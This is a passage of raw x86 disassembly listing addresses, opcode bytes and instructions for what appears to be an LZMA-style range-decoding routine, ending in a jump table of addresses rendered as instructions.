  406b15:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406b18:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  406b1b:	eb 28                	jmp    0x406b45
  406b1d:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b21:	0f 84 21 03 00 00    	je     0x406e48
  406b27:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406b2a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406b2d:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406b31:	0f b6 09             	movzbl (%ecx),%ecx
  406b34:	ff 4d 94             	decl   -0x6c(%ebp)
  406b37:	c1 e0 08             	shl    $0x8,%eax
  406b3a:	0b c1                	or     %ecx,%eax
  406b3c:	ff 45 90             	incl   -0x70(%ebp)
  406b3f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406b42:	ff 45 b8             	incl   -0x48(%ebp)
  406b45:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406b48:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406b4b:	7d 72                	jge    0x406bbf
  406b4d:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406b50:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406b53:	c1 ea 0b             	shr    $0xb,%edx
  406b56:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  406b59:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406b5c:	8d 34 07             	lea    (%edi,%eax,1),%esi
  406b5f:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406b62:	66 8b 06             	mov    (%esi),%ax
  406b65:	0f b7 c8             	movzwl %ax,%ecx
  406b68:	0f af d1             	imul   %ecx,%edx
  406b6b:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  406b6e:	73 17                	jae    0x406b87
  406b70:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406b73:	ba 00 08 00 00       	mov    $0x800,%edx
  406b78:	2b d1                	sub    %ecx,%edx
  406b7a:	c1 fa 05             	sar    $0x5,%edx
  406b7d:	03 d0                	add    %eax,%edx
  406b7f:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406b82:	66 89 16             	mov    %dx,(%esi)
  406b85:	eb 2a                	jmp    0x406bb1
  406b87:	33 c9                	xor    %ecx,%ecx
  406b89:	29 55 f0             	sub    %edx,-0x10(%ebp)
  406b8c:	41                   	inc    %ecx
  406b8d:	29 55 f4             	sub    %edx,-0xc(%ebp)
  406b90:	8b d9                	mov    %ecx,%ebx
  406b92:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  406b95:	d3 e3                	shl    %cl,%ebx
  406b97:	8b cb                	mov    %ebx,%ecx
  406b99:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406b9c:	0b d9                	or     %ecx,%ebx
  406b9e:	66 8b c8             	mov    %ax,%cx
  406ba1:	66 c1 e9 05          	shr    $0x5,%cx
  406ba5:	2b c1                	sub    %ecx,%eax
  406ba7:	47                   	inc    %edi
  406ba8:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406bab:	66 89 06             	mov    %ax,(%esi)
  406bae:	89 7d b0             	mov    %edi,-0x50(%ebp)
  406bb1:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406bb8:	73 88                	jae    0x406b42
  406bba:	e9 5e ff ff ff       	jmp    0x406b1d
  406bbf:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  406bc2:	ff 45 d4             	incl   -0x2c(%ebp)
  406bc5:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406bc8:	85 c0                	test   %eax,%eax
  406bca:	0f 84 84 02 00 00    	je     0x406e54
  406bd0:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  406bd3:	0f 87 b8 02 00 00    	ja     0x406e91
  406bd9:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  406bdd:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406be0:	01 45 a0             	add    %eax,-0x60(%ebp)
  406be3:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406be7:	0f 84 6d 02 00 00    	je     0x406e5a
  406bed:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406bf0:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406bf3:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406bf6:	72 03                	jb     0x406bfb
  406bf8:	03 45 8c             	add    -0x74(%ebp),%eax
  406bfb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406bfe:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406c01:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406c04:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406c07:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406c0a:	40                   	inc    %eax
  406c0b:	33 d2                	xor    %edx,%edx
  406c0d:	f7 75 8c             	divl   -0x74(%ebp)
  406c10:	8b 45 98             	mov    -0x68(%ebp),%eax
  406c13:	ff 45 98             	incl   -0x68(%ebp)
  406c16:	ff 4d 9c             	decl   -0x64(%ebp)
  406c19:	ff 4d d0             	decl   -0x30(%ebp)
  406c1c:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406c20:	88 08                	mov    %cl,(%eax)
  406c22:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406c25:	7f bc                	jg     0x406be3
  406c27:	e9 78 fd ff ff       	jmp    0x4069a4
  406c2c:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406c30:	75 20                	jne    0x406c52
  406c32:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406c35:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  406c39:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406c3c:	c1 e0 04             	shl    $0x4,%eax
  406c3f:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  406c43:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406c46:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  406c4d:	e9 ce 00 00 00       	jmp    0x406d20
  406c52:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406c55:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  406c5c:	00 00 00 
  406c5f:	8d 70 02             	lea    0x2(%eax),%esi
  406c62:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406c65:	66 8b 06             	mov    (%esi),%ax
  406c68:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406c6b:	0f b7 d0             	movzwl %ax,%edx
  406c6e:	c1 e9 0b             	shr    $0xb,%ecx
  406c71:	0f af ca             	imul   %edx,%ecx
  406c74:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406c77:	73 18                	jae    0x406c91
  406c79:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406c7c:	b9 00 08 00 00       	mov    $0x800,%ecx
  406c81:	2b ca                	sub    %edx,%ecx
  406c83:	c1 f9 05             	sar    $0x5,%ecx
  406c86:	03 c8                	add    %eax,%ecx
  406c88:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406c8c:	66 89 0e             	mov    %cx,(%esi)
  406c8f:	eb 19                	jmp    0x406caa
  406c91:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406c94:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406c97:	66 8b c8             	mov    %ax,%cx
  406c9a:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406ca1:	66 c1 e9 05          	shr    $0x5,%cx
  406ca5:	2b c1                	sub    %ecx,%eax
  406ca7:	66 89 06             	mov    %ax,(%esi)
  406caa:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406cb1:	73 25                	jae    0x406cd8
  406cb3:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406cb7:	0f 84 a9 01 00 00    	je     0x406e66
  406cbd:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406cc0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406cc3:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406cc7:	0f b6 09             	movzbl (%ecx),%ecx
  406cca:	ff 4d 94             	decl   -0x6c(%ebp)
  406ccd:	c1 e0 08             	shl    $0x8,%eax
  406cd0:	0b c1                	or     %ecx,%eax
  406cd2:	ff 45 90             	incl   -0x70(%ebp)
  406cd5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406cd8:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  406cde:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  406ce4:	e9 91 f7 ff ff       	jmp    0x40647a
  406ce9:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406ced:	75 1c                	jne    0x406d0b
  406cef:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406cf2:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406cf5:	c1 e0 04             	shl    $0x4,%eax
  406cf8:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  406cff:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  406d06:	e9 38 ff ff ff       	jmp    0x406c43
  406d0b:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  406d12:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  406d19:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  406d20:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  406d27:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d2a:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406d31:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406d34:	eb 28                	jmp    0x406d5e
  406d36:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406d3a:	0f 84 32 01 00 00    	je     0x406e72
  406d40:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d43:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d46:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406d4a:	0f b6 09             	movzbl (%ecx),%ecx
  406d4d:	ff 4d 94             	decl   -0x6c(%ebp)
  406d50:	c1 e0 08             	shl    $0x8,%eax
  406d53:	0b c1                	or     %ecx,%eax
  406d55:	ff 45 90             	incl   -0x70(%ebp)
  406d58:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d5b:	ff 4d b8             	decl   -0x48(%ebp)
  406d5e:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406d62:	7e 5e                	jle    0x406dc2
  406d64:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406d67:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d6a:	c1 e9 0b             	shr    $0xb,%ecx
  406d6d:	8d 14 00             	lea    (%eax,%eax,1),%edx
  406d70:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406d73:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406d76:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406d79:	66 8b 06             	mov    (%esi),%ax
  406d7c:	0f b7 f8             	movzwl %ax,%edi
  406d7f:	0f af cf             	imul   %edi,%ecx
  406d82:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406d85:	73 17                	jae    0x406d9e
  406d87:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406d8a:	b9 00 08 00 00       	mov    $0x800,%ecx
  406d8f:	2b cf                	sub    %edi,%ecx
  406d91:	c1 f9 05             	sar    $0x5,%ecx
  406d94:	03 c8                	add    %eax,%ecx
  406d96:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406d99:	66 89 0e             	mov    %cx,(%esi)
  406d9c:	eb 16                	jmp    0x406db4
  406d9e:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406da1:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406da4:	66 8b c8             	mov    %ax,%cx
  406da7:	66 c1 e9 05          	shr    $0x5,%cx
  406dab:	2b c1                	sub    %ecx,%eax
  406dad:	42                   	inc    %edx
  406dae:	66 89 06             	mov    %ax,(%esi)
  406db1:	89 55 b0             	mov    %edx,-0x50(%ebp)
  406db4:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406dbb:	73 9e                	jae    0x406d5b
  406dbd:	e9 74 ff ff ff       	jmp    0x406d36
  406dc2:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  406dc5:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  406dc8:	33 c0                	xor    %eax,%eax
  406dca:	40                   	inc    %eax
  406dcb:	d3 e0                	shl    %cl,%eax
  406dcd:	2b d8                	sub    %eax,%ebx
  406dcf:	8b 45 84             	mov    -0x7c(%ebp),%eax
  406dd2:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406dd5:	e9 04 ff ff ff       	jmp    0x406cde
  406dda:	01 5d d0             	add    %ebx,-0x30(%ebp)
  406ddd:	8b 45 80             	mov    -0x80(%ebp),%eax
  406de0:	e9 f9 fe ff ff       	jmp    0x406cde
  406de5:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  406dec:	00 00 00 
  406def:	e9 88 00 00 00       	jmp    0x406e7c
  406df4:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  406dfb:	00 00 00 
  406dfe:	eb 7c                	jmp    0x406e7c
  406e00:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  406e07:	00 00 00 
  406e0a:	eb 70                	jmp    0x406e7c
  406e0c:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  406e13:	00 00 00 
  406e16:	eb 64                	jmp    0x406e7c
  406e18:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  406e1f:	00 00 00 
  406e22:	eb 58                	jmp    0x406e7c
  406e24:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  406e2b:	00 00 00 
  406e2e:	eb 4c                	jmp    0x406e7c
  406e30:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  406e37:	00 00 00 
  406e3a:	eb 40                	jmp    0x406e7c
  406e3c:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  406e43:	00 00 00 
  406e46:	eb 34                	jmp    0x406e7c
  406e48:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  406e4f:	00 00 00 
  406e52:	eb 28                	jmp    0x406e7c
  406e54:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  406e58:	eb 22                	jmp    0x406e7c
  406e5a:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  406e61:	00 00 00 
  406e64:	eb 16                	jmp    0x406e7c
  406e66:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  406e6d:	00 00 00 
  406e70:	eb 0a                	jmp    0x406e7c
  406e72:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  406e79:	00 00 00 
  406e7c:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  406e82:	6a 22                	push   $0x22
  406e84:	59                   	pop    %ecx
  406e85:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  406e8b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406e8d:	33 c0                	xor    %eax,%eax
  406e8f:	eb 03                	jmp    0x406e94
  406e91:	83 c8 ff             	or     $0xffffffff,%eax
  406e94:	5f                   	pop    %edi
  406e95:	5e                   	pop    %esi
  406e96:	5b                   	pop    %ebx
  406e97:	c9                   	leave
  406e98:	c3                   	ret
  406e99:	90                   	nop
  406e9a:	64 40                	fs inc %eax
  406e9c:	00 35 65 40 00 d0    	add    %dh,0xd0004065
  406ea2:	65 40                	gs inc %eax
  406ea4:	00 a5 65 40 00 65    	add    %ah,0x65004065(%ebp)
  406eaa:	6c                   	insb   (%dx),%es:(%edi)
  406eab:	40                   	inc    %eax
  406eac:	00 b3 6c 40 00 f6    	add    %dh,-0x9ffbf94(%ebx)
  406eb2:	65 40                	gs inc %eax
  406eb4:	00 95 68 40 00 ff    	add    %dl,-0xffbf98(%ebp)
  406eba:	68 40 00 42 69       	push   $0x69420040
  406ebf:	40                   	inc    %eax
  406ec0:	00 b3 69 40 00 da    	add    %dh,-0x25ffbf97(%ebx)
  406ec6:	69 40 00 9a 6a 40 00 	imul   $0x406a9a,0x0(%eax),%eax
  406ecd:	8f                   	(bad)
  406ece:	66 40                	inc    %ax
  406ed0:	00 48 67             	add    %cl,0x67(%eax)
  406ed3:	40                   	inc    %eax
  406ed4:	00 0c 68             	add    %cl,(%eax,%ebp,2)
  406ed7:	40                   	inc    %eax
  406ed8:	00 1d 6b 40 00 ed    	add    %bl,0xed00406b
  406ede:	68 40 00 2c 6c       	push   $0x6c2c0040
  406ee3:	40                   	inc    %eax
  406ee4:	00 e9                	add    %ch,%cl
  406ee6:	6c                   	insb   (%dx),%es:(%edi)
  406ee7:	40                   	inc    %eax
  406ee8:	00 da                	add    %bl,%dl
  406eea:	6d                   	insl   (%dx),%es:(%edi)
  406eeb:	40                   	inc    %eax
  406eec:	00 14 6a             	add    %dl,(%edx,%ebp,2)
  406eef:	40                   	inc    %eax
  406ef0:	00 2b                	add    %ch,(%ebx)
  406ef2:	6a 40                	push   $0x40
  406ef4:	00 27                	add    %ah,(%edi)
  406ef6:	6d                   	insl   (%dx),%es:(%edi)
  406ef7:	40                   	inc    %eax
  406ef8:	00 36                	add    %dh,(%esi)
  406efa:	6d                   	insl   (%dx),%es:(%edi)
  406efb:	40                   	inc    %eax
  406efc:	00 59 6a             	add    %bl,0x6a(%ecx)
  406eff:	40                   	inc    %eax
  406f00:	00 db                	add    %bl,%bl
  406f02:	67 40                	addr16 inc %eax
  406f04:	00 66 69             	add    %ah,0x69(%esi)
  406f07:	40                   	inc    %eax
  406f08:	00 e3                	add    %ah,%bl
  406f0a:	6b                   	.byte 0x6b
  406f0b:	40                   	inc    %eax
	...
